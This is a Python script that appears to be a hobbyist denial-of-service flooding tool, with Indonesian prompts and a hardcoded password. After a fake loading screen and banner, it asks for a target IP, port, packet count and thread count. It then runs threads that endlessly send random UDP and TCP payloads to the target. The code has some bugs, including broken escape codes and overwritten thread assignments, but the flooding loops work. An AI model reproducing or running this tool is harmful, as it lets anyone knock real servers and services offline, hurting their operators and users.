import random
import socket
import time
import threading
import os,sys
import random, socket, threading

pasw = "Gin"

for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[0] Loading...")
        time.sleep(1)
        print("[16] Loading...")
        print("[20] Loading...")
        time.sleep(1)
        print("[30] Loading...")
        time.sleep(1)
        print("[40] Loading...")
        time.sleep(1)
        print("[50] Loading...")
        time.sleep(1)
        print("[60] Loading...")
        time.sleep(1)
        print("[70] Loading...")
        time.sleep(1)
        print("[80] Loading...")
        time.sleep(1)
        print("[90] Loading...")
        time.sleep(1)
        print("[100] Processing\n")
        time.sleep(3)
        break
    else:
        time.sleep(2)
        print("[x] salah yaaa wkwk \n")
        continue
time.sleep(2)
print("\033[31mSuccesfull Logins")
time.sleep(2)

print("\033[32m")
print("""
                                                     ──────────────────────────────────────
                                                     ─████████──████████─████████████████──
                                                     ─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██──
                                                     ─████▒▒██──██▒▒████─██▒▒████████▒▒██──
                                                     ───██▒▒▒▒██▒▒▒▒██───██▒▒██────██▒▒██──
                                                     ───████▒▒▒▒▒▒████───██▒▒████████▒▒██──
                                                     ─────██▒▒▒▒▒▒██─────██▒▒▒▒▒▒▒▒▒▒▒▒██──
                                                     ───████▒▒▒▒▒▒████───██▒▒██████▒▒████──
                                                     ───██▒▒▒▒██▒▒▒▒██───██▒▒██──██▒▒██────
                                                     ─████▒▒██──██▒▒████─██▒▒██──██▒▒██████
                                                     ─██▒▒▒▒██──██▒▒▒▒██─██▒▒██──██▒▒▒▒▒▒██
                                                     ─████████──████████─██████──██████████
                                                     ──────────────────────────────────────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████████████─██████████████─██████──────────██████─██████──────────██████─██████──██████─██████──────────██████─██████████─██████████████─████████──████████
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██████████████▒▒██─██▒▒██████████████▒▒██─██▒▒██──██▒▒██─██▒▒██████████──██▒▒██─██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒██──██▒▒▒▒██
─██▒▒██████████─██▒▒██████▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██──██▒▒██─████▒▒████─██████▒▒██████─████▒▒██──██▒▒████
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─██▒▒██████▒▒██████▒▒██─██▒▒██──██▒▒██─██▒▒██████▒▒██──██▒▒██───██▒▒██───────██▒▒██───────██▒▒▒▒██▒▒▒▒██──
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██───██▒▒██───────██▒▒██───────████▒▒▒▒▒▒████──
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██───██▒▒██───────██▒▒██─────────████▒▒████────
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██──██████──██▒▒██─██▒▒██──██████──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██───██▒▒██───────██▒▒██───────────██▒▒██──────
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─██▒▒██──────────██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██████▒▒██───██▒▒██───────██▒▒██───────────██▒▒██──────
─██▒▒██████████─██▒▒██████▒▒██─██▒▒██──────────██▒▒██─██▒▒██──────────██▒▒██─██▒▒██████▒▒██─██▒▒██──██▒▒▒▒▒▒▒▒▒▒██─████▒▒████─────██▒▒██───────────██▒▒██──────
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──────────██▒▒██─██▒▒██──────────██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██████████▒▒██─██▒▒▒▒▒▒██─────██▒▒██───────────██▒▒██──────
─██████████████─██████████████─██████──────────██████─██████──────────██████─██████████████─██████──────────██████─██████████─────██████───────────██████──────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Created by Ajelly & GinMusk""")
print("\033[97m")
print("\033[31m━━━ IP")
ip = str(input("┗━>\032[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\032[32m━━━ Sayang gw ga?")
choice = str(input("┗━>(y/n):"))
print("\033[31m━━━ Pakets")
times = int(input("┗━>\032[0m:"))
print("\033[31m━━━ Threads")
threads = int(input("┗━>\032[0m:"))
def run():
	data = random._urandom(1131)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XR ATTACK TO")
		except:
			print("[!] XR ATTACK TO")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XR ATTACK TO")
		except:
			s.close()
			print("[*] XR ATTACK TO")

def run3():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> XR ATTACK TO \032[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")
	  
def xxxx():
  data = random._urandom(761)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> XR ATTACK TO \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")
   
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th = threading.Thread(target = run3)
		th = threading.Thread(target = xxxx)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
